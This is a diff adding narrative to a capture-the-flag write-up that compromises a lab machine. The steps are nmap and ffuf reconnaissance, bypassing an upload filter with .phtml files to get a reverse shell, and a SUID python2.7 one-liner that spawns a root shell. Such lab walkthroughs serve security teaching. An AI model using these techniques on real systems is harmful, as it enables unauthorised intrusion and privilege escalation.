@@ -4,6 +4,8 @@
 
 ## Reconnaissance
 
+I started running nmap and I got this result:
+
 ```
 $ nmap -sV -sC 10.67.178.184
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 05:33 -0500
@@ -29,6 +31,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds
 ```
 
+Accessing the main page, I find this. 
+
+<figure><img src="rootme-1.png" alt=""><figcaption></figcaption></figure>
+
+I ran ffuf to enumerate directories.
 
 ```
 $ ffuf -u http://10.67.178.184/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt 
@@ -59,9 +66,44 @@ panel             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 132ms
 js                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 139ms]
 ```
 
+Accessing `panel` directory, there is a page that contains a file upload.
 
+<figure><img src="rootme-2.png" alt=""><figcaption></figcaption></figure>
 
+Since I knew that the application was using PHP, I attempted to upload a PHP file, which it was not permitted.
+
+<figure><img src="rootme-3.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="rootme-4.png" alt=""><figcaption></figcaption></figure>
+
+It seems that there is a filter preventing the upload of files with the `.php` extension. There are a few ways to bypass this. First, I tried to upload a file with the `.PhP` extension, and it didn't work.
+
+<figure><img src="rootme-5.png" alt=""><figcaption></figcaption></figure>
+
+After that, I attempted to upload a `.phtml` file and it worked! I could also upload a file with the `.php5` extension, and that would worked too.
+
+<figure><img src="rootme-6.png" alt=""><figcaption></figcaption></figure>
+
+Listening on port `1337`, I got a shell as `www-data`.
+
+<figure><img src="rootme-7.png" alt=""><figcaption></figcaption></figure>
+
+Reading the `user.txt` flag.
+
+<figure><img src="rootme-8.png" alt=""><figcaption></figcaption></figure>
+
+Find for binaries with the SUID permission bit set, I found `/usr/bin/python2.7`, that's interesting.
+
+<figure><img src="rootme-9.png" alt=""><figcaption></figcaption></figure>
+
+As we can see, we can take advantage of this to escalate privileges.
+
+<figure><img src="rootme-10.png" alt=""><figcaption></figcaption></figure>
+
+Running this command below, I was able to escalate to root and read the `root.txt` flag.
 
 ```
 python2.7 -c 'import os; os.execl("/bin/bash", "sh", "-p")'
 ```
+
+<figure><img src="rootme-11.png" alt=""><figcaption></figcaption></figure>
+
